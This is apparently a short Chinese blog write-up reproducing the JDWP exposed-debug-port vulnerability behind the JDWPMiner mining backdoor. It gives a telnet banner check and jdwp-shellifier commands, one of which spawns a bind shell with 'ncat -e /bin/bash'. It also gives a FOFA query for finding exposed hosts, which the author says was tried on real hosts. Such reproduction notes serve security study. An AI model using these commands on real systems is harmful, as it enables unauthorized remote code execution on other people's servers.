安全客上看到阿里云团队发布的：JDWPMiner挖矿木马后门简要分析  
遂复现此漏洞

### 原理介绍：

JDWP（Java DEbugger Wire Protocol）：即Java调试线协议，是一个为Java调试而设计的通讯交互协议，它定义了调试器和被调试程序之间传递的信息的格式。说白了就是JVM或者类JVM的虚拟机都支持一种协议，通过该协议，Debugger 端可以和 target VM 通信，可以获取目标 VM的包括类、对象、线程等信息，在调试Android应用程序这一场景中，Debugger一般是指你的 develop machine 的某一支持 JDWP协议的工具例如 Android Studio 或者 JDB，而 Target JVM是指运行在你mobile设备当中的各个App（因为它们都是一个个虚拟机 Dalvik 或者 ART），JDWP Agent一般负责监听某一个端口，当有 Debugger向这一个端口发起请求的时候，Agent 就转发该请求给 target JVM并最终由该 JVM 来处理请求，并把 reply 信息返回给 Debugger 端。

### 简单检测方法：  
```
telnet ip port
```
查看回显，如果出现“JDWP-Handshake”，则证明漏洞存在。如下图  
[image](./pic/1.png)  

### 漏洞复现：
借助工具：https://github.com/IOActive/jdwp-shellifier  
用法：
```
python2 ./jdwp-shellifier.py -t my.target.ip -p 1234
python2 ./jdwp-shellifier.py -t my.target.ip -p 1234 --cmd "ncat -v -l -p 1234 -e /bin/bash"
```
### 目标搜索
fofa上搜索目标
```
banner="jdwp"
```
试了几个都没有漏洞，暂不批量检测了

参考链接：  
https://zhuanlan.zhihu.com/p/147315596  
